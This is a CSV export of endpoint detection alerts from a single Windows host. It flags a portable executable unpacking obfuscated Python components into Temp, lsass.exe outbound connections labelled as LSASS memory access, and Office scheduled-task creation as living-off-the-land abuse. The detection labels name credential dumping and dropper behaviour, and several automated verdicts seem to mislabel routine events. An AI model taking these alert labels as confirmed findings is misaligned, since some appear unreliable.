Timestamp,Process,Parent Process,Command Line,Detection Type,Risk Score,Investigation Reason,Source IP,Destination IP,Registry Path,File Path,DNS Query,Event Action,PID,MITRE Technique,MITRE Name,Allowlisted,Severity,Confidence,FP Assessment,Analyst Verdict,Recommendation,Alert ID
"Jun 1, 2026 @ 14:22:58.735",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\libcrypto-3.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-C8FC3CAE
"Jun 1, 2026 @ 14:22:58.737",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\libffi-8.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A74046EE
"Jun 1, 2026 @ 14:23:04.799",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002_b.js,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-7407191D
"Jun 1, 2026 @ 14:23:04.800",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002_d.js,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-13C292B0
"Jun 1, 2026 @ 14:23:04.802",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002_n.js,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-AF108442
"Jun 1, 2026 @ 14:23:04.821",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002a.txt,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-CAD636D9
"Jun 1, 2026 @ 14:23:04.823",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002w.txt,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-97B12762
"Jun 1, 2026 @ 14:22:58.536",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\campus.py,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6D75E487
"Jun 1, 2026 @ 14:22:58.538",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002.xml,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-E300F910
"Jun 1, 2026 @ 14:22:58.541",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_b.js,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-0F6E8B14
"Jun 1, 2026 @ 14:22:58.543",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_d.js,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-D2C665AA
"Jun 1, 2026 @ 14:23:04.627",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,start,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-BD2E9A17
"Jun 1, 2026 @ 14:23:04.556",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A6B3A526
"Jun 1, 2026 @ 14:23:01.256",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,,,modification,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F7ED124F
"Jun 1, 2026 @ 14:23:01.255",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,,,modification,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-32FCE8EA
"Jun 1, 2026 @ 14:22:59.785",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-DCFE0F59
"Jun 1, 2026 @ 14:22:59.753",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A12435C7
"Jun 1, 2026 @ 14:22:59.575",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2516C28A
"Jun 1, 2026 @ 14:22:59.535",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-C8AAB233
"Jun 1, 2026 @ 14:22:58.739",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\psutil\_psutil_windows.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-ECA3BD31
"Jun 1, 2026 @ 14:23:04.749",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\VCRUNTIME140.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-D48E199B
"Jun 1, 2026 @ 14:23:04.754",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_bz2.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-E72509A2
"Jun 1, 2026 @ 14:23:04.751",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\VCRUNTIME140_1.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-54772DE8
"Jun 1, 2026 @ 14:23:04.761",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_decimal.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2D96161D
"Jun 1, 2026 @ 14:23:04.763",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_hashlib.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-E0102BE8
"Jun 1, 2026 @ 14:22:58.748",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\pyarmor_runtime_000000\pyarmor_runtime.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-84C0EEDB
"Jun 1, 2026 @ 14:23:04.756",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_ctypes.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6B990D6C
"Jun 1, 2026 @ 14:22:59.240",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-E8ACEDD0
"Jun 1, 2026 @ 14:22:59.216",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-CFFD6764
"Jun 1, 2026 @ 14:22:59.191",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A3C3CD65
"Jun 1, 2026 @ 14:22:59.120",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-888559A7
"Jun 1, 2026 @ 14:22:58.838",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,start,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F262D965
"Jun 1, 2026 @ 14:22:58.837",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\unicodedata.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-0619DC48
"Jun 1, 2026 @ 14:22:58.828",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\select.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-D69284F2
"Jun 1, 2026 @ 14:22:58.825",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\python313.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-9B6B013F
"Jun 1, 2026 @ 14:22:58.750",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\python3.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-0BA64E59
"Jun 1, 2026 @ 14:22:59.464",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A7E23538
"Jun 1, 2026 @ 14:22:59.409",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-808E1AD1
"Jun 1, 2026 @ 14:22:59.437",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A0C7FDF4
"Jun 1, 2026 @ 14:22:59.300",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2FF960D6
"Jun 1, 2026 @ 14:22:59.323",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-99B251BC
"Jun 1, 2026 @ 14:23:27.265",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\VCRUNTIME140.dll,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-168F2198
"Jun 1, 2026 @ 14:23:27.273",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-3412C030
"Jun 1, 2026 @ 14:24:20.654",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 23.37.85.99 ; Unusual process accessing LSASS memory,173.10.254.170,23.37.85.99,,,,disconnect_received,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-3129483B
"Jun 1, 2026 @ 14:21:05.415",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\ServiceWatcherSchedule.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"28,276",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-7C57DEEC
"Jun 1, 2026 @ 14:24:20.573",C:\Windows\System32\lsass.exe,,,External Communication | Sigma Match,60,Outbound to external IP: 104.18.20.213 ; Unusual process accessing LSASS memory,173.10.254.170,104.18.20.213,,,,disconnect_received,992,T1003.001,,False,HIGH,MEDIUM,Suspicious,Investigate,Block destination IP at perimeter; review netflow,AH-6FE49800
"Jun 1, 2026 @ 14:21:06.112",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Automatic Updates 2.0"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\FrequentOfficeUpdateSchedule.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"26,680",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-552E204E
"Jun 1, 2026 @ 14:21:06.399",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Automatic Updates 2.0"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\FrequentOfficeUpdateSchedule.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"26,680",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-C19DE018
"Jun 1, 2026 @ 14:21:05.153",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\ServiceWatcherSchedule.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"28,276",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-3BCAC74A
"Jun 1, 2026 @ 14:21:18.116",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Startup Maintenance"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Startup Maintenance.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"22,372",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-D44B6BDC
"Jun 1, 2026 @ 14:21:57.140",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Background Push Maintenance"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\PushRegistrationTask.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"12,400",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-632DDB4C
"Jun 1, 2026 @ 14:21:57.046",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Background Push Maintenance"" /XML ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\PushRegistrationTask.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"12,400",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-D56A2A89
"Jun 1, 2026 @ 14:21:45.827",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,60,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\thm.wxl,,deletion,"29,508",,,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-BD697DFE
"Jun 1, 2026 @ 14:21:47.395",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,60,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1055\thm.wxl,,deletion,"34,308",,,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-5287089C
"Jun 1, 2026 @ 14:21:47.392",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,60,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1045\license.rtf,,deletion,"34,308",,,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-72251B2B
"Jun 1, 2026 @ 14:21:17.622",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Performance Monitor"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Performance Monitor.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"22,780",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-45AD48AF
"Jun 1, 2026 @ 14:21:17.938",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Actions Server"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Actions Server.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"21,536",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-CDA4912F
"Jun 1, 2026 @ 14:21:17.827",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Actions Server"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Actions Server.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,start,"21,536",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-B2BFA110
"Jun 1, 2026 @ 14:21:17.730",C:\Windows\System32\schtasks.exe,C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,"schtasks.exe /Create /tn ""Microsoft\Office\Office Performance Monitor"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Performance Monitor.xml""",LOLBin Abuse | Sigma Match,60,Living-off-the-land binary: schtasks.exe ; schtasks creating a task,,,,,,end,"22,780",T1053.005,Scheduled Task,False,HIGH,MEDIUM,Suspicious,Investigate,Review full command line and parent process chain,AH-FC61899A
